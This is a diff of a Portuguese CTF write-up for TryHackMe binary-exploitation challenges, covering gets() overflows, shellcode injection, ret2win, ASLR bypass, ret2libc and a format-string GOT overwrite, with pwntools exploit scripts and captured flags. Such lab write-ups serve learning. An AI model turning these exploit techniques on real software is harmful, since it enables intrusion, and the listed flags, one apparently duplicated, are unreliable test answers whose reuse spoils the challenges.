@@ -1,3 +1,5 @@
+# Trypwnmeone
+
 ## Desafio: TryOverlfowMe 1 (Exploração Binária)
 
 ### Introdução:
@@ -10,7 +12,7 @@ O programa recebe uma entrada do usuário através da função insegura gets(). 
 
 A vulnerabilidade existe devido ao uso da função gets(), que não realiza verificação de limites (bounds checking). Isso nos permite executar um buffer overflow, sobrescrever o conteúdo da variável admin e ler a flag.
 
-'''bash
+```bash
 int main(){
     setup();
     banner();
@@ -35,18 +37,19 @@ int main(){
         exit(1);
     }
 }
-''' 
+```
 
 O próximo passo é executar o overflowme1 para observar seu comportamento. Ao fornecer um comentário que excede o buffer, conseguimos causar uma falha de segmentação (segmentation fault).
 
 ### Solução:
 
 Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.
+
 Ele cria um payload com 16 bytes de preenchimento (padding) seguidos por 32 repetições do valor 1 (empacotado em 32 bits com p32(1)), com o objetivo de sobrescrever a variável admin.
 
 Por fim, ele envia o payload e entra em modo interativo para receber a saída do servidor.
 
-'''bash
+```bash
 from pwn import *
 
 # IP e porta do alvo
@@ -67,11 +70,11 @@ p.sendline(payload)
 
 # Interage com o programa para ver o resultado (a flag)
 p.interactive()
-'''
+```
 
 Após executarmos nosso script, recebemos a flag do primeiro desafio.
 
-'.         '
+`THM{Oooooooooooooovvvvverrrflloowwwwww}`
 
 ## Desafio: TryOverflowMe 2 (Exploração Binária)
 
@@ -82,9 +85,10 @@ No segundo desafio, também enfrentamos uma vulnerabilidade clássica de buffer 
 ### Análise inicial:
 
 Assim como no desafio anterior, o programa recebe uma entrada do usuário. Ele verifica se um valor específico (0x59595959) está definido na variável admin e, em caso afirmativo, lê e imprime o conteúdo de flag.txt. Caso contrário, ele encerra.
+
 Desta vez, o buffer é um pouco maior (64 bytes) e o valor para o qual a variável admin deve ser alterada é 0x59595959.
 
-'''bash
+```bash
 int read_flag(){
         const char* filename = "flag.txt";
         FILE* file = fopen(filename, "r");
@@ -120,17 +124,18 @@ int main(){
         exit(1);
     }
 }
-'''
+```
 
 Ao executarmos o overflowme2 para testar, confirmamos que, ao fornecer um comentário maior que o buffer, causamos uma falha de segmentação (segmentation fault).
 
 ### Solução:
-
 Com o script Pwntools a seguir, conseguimos nos conectar à máquina alvo do desafio.
+
 Ele cria um payload que consiste em 64 bytes A (padding) para estourar o buffer, seguido pelo valor 0x59595959 (empacotado com p32) repetido várias vezes para garantir a sobrescrita da variável admin.
+
 Após enviar o payload, o script entra em modo interativo para exibir a flag retornada pelo servidor.
 
-'''bash
+```bash
 from pwn import *
 
 # IP e porta do alvo
@@ -151,24 +156,22 @@ p.sendline(payload)
 
 # Interage com o programa para ver o resultado (a flag)
 p.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos a flag do segundo desafio.
 
-'.          '
+`THM{why_just_the_A_have_all_theFun?}`
 
 ## Desafio: TryExecMe (Exploração Binária)
 
 ### Introdução:
-
 Este desafio não exige um overflow para explorar a vulnerabilidade. Este tipo de exploração binária envolve a injeção de shellcode.
 
 ### Análise inicial:
-
 O programa deste desafio lê a entrada do usuário para um buffer e, em seguida, tenta executá-la como se fosse uma função. Ao fornecer um shellcode válido, conseguimos obter uma shell.
+
 A vulnerabilidade reside na seguinte linha, pois ela aceita diretamente a entrada do usuário e tenta executá-la como código:
 
-'''bash
+```bash
 ( ( void (*) () ) buf) ();
 '''
 
@@ -185,16 +188,15 @@ int main(){
     ( ( void (*) () ) buf) (); // Executa o conteúdo do buffer
 
 }
-'''
-
+```
 O próximo passo é executar o tryexecme para observar seu comportamento. O programa solicita que forneçamos nossa "shell" e diz que irá executá-la.
 
 ### Solução
-
 Usamos o script Pwntools a seguir para resolver o desafio. Precisamos definir o contexto da arquitetura para amd64 (para a geração correta do shellcode) e, em seguida, conectar à máquina alvo.
+
 O script cria um shellcode que gera uma shell (shellcraft.sh()) e o envia como payload. Finalmente, mudamos para o modo interativo para interagir com a shell que recebemos.
 
-'''bash
+```bash
 from pwn import *
 
 # Configura o contexto do pwntools para o binário
@@ -212,24 +214,22 @@ p.sendline(payload)
 
 # Interage com a shell
 p.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do terceiro desafio.
 
-'.          '
+`THM{a_r3t_to_w1n_by_thm}`
 
 ##Desafio: TryRetMe (Exploração Binária)
 
 ### Introdução:
-
 No quarto desafio, enfrentamos uma vulnerabilidade do tipo ret2win. Um ret2win (Return-to-Win) é um tipo de binário onde existe uma função win() (ou equivalente) que não é chamada, e nosso objetivo é redirecionar a execução do programa para ela.
 
 ### Análise inicial:
-
 O programa exibe a mensagem "Return to where? : " e lê até 512 bytes de entrada. Após ler a entrada, ele imprime "ok, let's go!" e termina.
+
 A função win(), que executaria system("/bin/sh") e nos daria uma shell, é definida no código, mas nunca é invocada no fluxo de execução normal.
 
-'''bash
+```bash
 int win(){
 
     system("/bin/sh");
@@ -246,37 +246,32 @@ int main(){
     setup();
     vuln();
 }
-'''
-
+```
 Nosso objetivo é usar o buffer overflow na função vuln() para sobrescrever o endereço de retorno na stack (controlando o registrador $rsp) e substituí-lo pelo endereço da função win().
+
 Para isso, precisamos de duas informações:
 
 1. O offset (quantos bytes) até o endereço de retorno.
-
 2. O endereço da função win().
 
 Para determinar o offset, usamos o GDB com GEF:
 
 1. Geramos um padrão cíclico (cyclic pattern).
-
 2. Executamos o programa no GDB (run).
-
 3. Colamos o padrão como entrada, o que causa um overflow e uma falha de segmentação.
 
 Ao inspecionar o registrador $rsp no momento da falha, o GEF nos mostra que o offset é de 264 bytes. Isso significa que, após 264 bytes de preenchimento, podemos escrever o endereço para onde queremos que a execução retorne.
 
-###Solução:
-
+### Solução:
 Como mencionado no desafio, o sistema (Ubuntu) pode ter problemas de alinhamento de pilha (stack alignment issues). Para resolver isso, adicionamos um ret gadget ao nosso payload. Este gadget é simplesmente uma instrução ret que colocamos na pilha logo antes do endereço da função win(). Isso garante que a pilha esteja corretamente alinhada quando win() for chamada.
+
 O script Pwntools a seguir é usado para explorar a vulnerabilidade. Ele monta um payload que consiste em:
 
 1. Padding: 264 bytes de lixo (b'A').
-
 2. ret gadget: O endereço de uma instrução ret (encontrada pelo Pwntools).
-
 3. Endereço win: O endereço da função win (obtido dos símbolos do ELF).
 
-'''bash
+```bash
 from pwn import *
 
 # Define o contexto do binário
@@ -305,22 +300,22 @@ p.sendlineafter('Return to where? : ', payload)
 
 # Interage com a shell
 p.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do quarto desafio.
 
-##Desafio: Random Memories (Exploração Binária)
+`THM{a_r3t_to_w1n_by_thm}`
+
+## Desafio: Random Memories (Exploração Binária)
 
 ###Introdução:
-
 Esta é uma continuação da vulnerabilidade ret2win anterior. No entanto, desta vez estamos lidando com ASLR (Address Space Layout Randomization). Novamente, temos uma função win() cujo endereço queremos sobrescrever no registrador $rsp.
+
 O ASLR é uma técnica de segurança que randomiza os endereços de memória, tornando mais difícil para um atacante prever a localização de funções críticas. Este mecanismo pode ser contornado (bypassed) se recebermos endereços vazados (leaked addresses), pois podemos determinar o offset relativo ao endereço base a partir desse vazamento.
 
 ### Análise inicial:
-
 O programa exibe o endereço da função vuln() (o "vazamento"), em seguida, solicita uma entrada. Ele lê 512 bytes para um buffer de apenas 32 bytes, causando um buffer overflow. A função win() não é chamada diretamente.
 
-'''bash
+```bash
 int win(){
     system("/bin/sh\0");
 }
@@ -338,42 +333,37 @@ int main(){
     banner();
     vuln();
 }
-'''
-
+```
 Ao executar o random, ele nos dá o "segredo": o endereço da função vuln(), que muda a cada execução por causa do ASLR.
+
 Como no desafio anterior, precisamos do offset para o $rsp. Usando GDB e um padrão cíclico (cyclic pattern), determinamos que o offset é, novamente, 264 bytes.
 
 Em seguida, precisamos dos offsets (distância do início do binário) das funções vuln e win. Podemos encontrá-los facilmente com o objdump:
 
-'''bash
+```bash
 objdump -d ./random | grep vuln
 objdump -d ./random | grep win
-'''
+```
 
 Ao contrário do desafio anterior (onde o endereço de win era estático), agora precisamos calcular o endereço real de win em tempo de execução. O endereço base é o endereço inicial onde o código do binário é carregado na memória.
 
 A fórmula para contornar o ASLR é:
 
 1. Endereço_Base = Endereço_Vazado_vuln - Offset_vuln
-
 2. Endereço_Real_win = Endereço_Base + Offset_win
 
 ### Solução 
 Com nosso script Pwntools, nós:
 
 1. Recebemos o endereço vazado da vuln().
-
 2. Calculamos o endereço base do binário (usando os offsets encontrados com o objdump).
-
 3. Calculamos o endereço real da win() e do ret gadget (necessário para alinhamento da pilha).
-
 4. Montamos o payload: 264 bytes de lixo + ret gadget + endereço da win().
-
 5. Enviamos o payload e obtemos a shell.
 
 <!-- end list -->
 
-'''bash
+```bash
 from pwn import *
 
 # Inicia o processo
@@ -415,11 +405,10 @@ p.sendline(payload)
 
 # Interage com a shell
 p.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do desafio.
 
-'.     '
+`THM{Th1s_R4ndom_acc3ss_m3mories_tututut_byp4ssed}`
 
 ## Desafio: The librarian (Exploração Binária)
 
@@ -446,10 +435,12 @@ Ao rodar o script parcial (primeiro estágio), vemos que o ASLR está ativo e os
 
 ### Solução:
 O script final combina as duas etapas. Ele envia o primeiro payload, recebe o leak da puts, e então calcula o endereço base da libc.
+
 A linha libc.address = leak - libc.symbols.puts calcula o endereço base da libc subtraindo o offset conhecido da puts (encontrado no arquivo libc.so.6) do endereço que vazamos em tempo de execução. Isso nos permite contornar o ASLR.
+
 Com o endereço base, calculamos os endereços de system e da string "/bin/sh" (cujos offsets foram encontrados previamente) e enviamos o segundo payload para obter a shell.
 
-'''bash
+```bash
 from pwn import * binary_file = './thelibrarian'
 libc = ELF('./libc.so.6')
 
@@ -508,23 +499,21 @@ p.recvuntil(b"ok, let's go!\n\n")
 
 # Interagir com a shell
 p.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sexto desafio.
 
-'.        '
+## Desafio: Not Specified (Exploração Binária)
 
-##Desafio: Not Specified (Exploração Binária)
-
-###Introdução
+### Introdução
 
 Neste desafio, estamos lidando com uma vulnerabilidade de Format String. Isso nos lembrou do desafio format string2 do picoCTF, mas aqui não temos nenhuma variável óbvia na stack para sobrescrever com nosso conteúdo.
 
 ### Análise inicial:
 O programa pede um nome de usuário (username) e o imprime usando printf sem qualquer proteção de formatação, tornando-o vulnerável a um ataque de format string.
+
 Além disso, o código-fonte revela uma função win() que contém uma chamada para system("/bin/sh"). Se conseguirmos explorar a falha para executar essa função, obteremos uma shell.
 
-'''bash
+```bash
 int win(){
     system("/bin/sh\0");
 }
@@ -540,25 +529,30 @@ int main(){
     puts("\nbye\n");
     exit(1);    
 }
-'''
+```
 
 Ao executar o notspecified, ele se comporta como esperado: após inserir um nome de usuário, ele é impresso na tela.
+
 A vulnerabilidade printf(username) permite que um usuário forneça especificadores de formato (como %s, %x, %n), o que pode levar a leituras ou escritas arbitrárias na memória.
+
 Primeiro, vamos descobrir onde nossa entrada está na pilha (o "offset"). Usamos o seguinte comando para vazar a pilha:
 
-'''bash
+```bash
 python -c "print('ABCDEFGH|' + '|'.join(['%d:%%p' % i for i in range(1,40)]))" | ./notspecified | grep 4847
-'''
+```
 
 Vemos, na sexta posição, o conteúdo da nossa entrada (o 4847... é o hexadecimal para HG... da nossa string ABCDEFGH). Isso significa que nosso offset é 6.
 
 ### Solução 
 Como podemos não apenas ler, mas também escrever na memória (usando %n), podemos alterar o fluxo do programa.
+
 A estratégia será usar a vulnerabilidade de format string para sobrescrever a entrada da GOT (Global Offset Table) da função exit() com o endereço da função win().
+
 O programa termina com uma chamada a exit(1). Ao sequestrar o ponteiro de exit@got, faremos com que o programa, ao tentar sair, execute a função win() e nos dê a shell.
+
 Embora isso possa ser feito manualmente (o que pode ser complicado devido ao alinhamento da pilha no Ubuntu), podemos usar a função fmtstr_payload do Pwntools para automatizar a criação do payload.
 
-'''bash
+```bash
 from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
 from pwn import *
 
@@ -590,8 +584,7 @@ print(send_payload(payload))
 
 # Recebe a shell
 s.interactive()
-'''
-
+```
 Após executarmos nosso script, recebemos uma shell na máquina alvo e conseguimos ler a flag do sétimo desafio.
 
-'.        '
+` THM{l3arn1ng_f0rm4t_str1ngs_awes0m3}`
